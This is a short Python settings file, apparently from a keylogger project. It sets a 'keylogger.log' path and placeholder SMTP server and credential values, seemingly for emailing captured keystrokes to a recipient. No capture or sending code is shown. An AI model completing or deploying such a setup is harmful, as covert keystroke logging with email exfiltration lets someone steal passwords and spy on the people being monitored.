import os

# Diretório de logs será definido de forma relativa
project_root = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_PATH = os.path.join(project_root, 'logs', 'keylogger.log')

# Configurações de email
SMTP_SERVER = "smtp.example.com"
SMTP_PORT = 587
SMTP_USERNAME = "your_email@example.com"
SMTP_PASSWORD = "your_password"
RECIPIENT_EMAIL = "recipient@example.com"
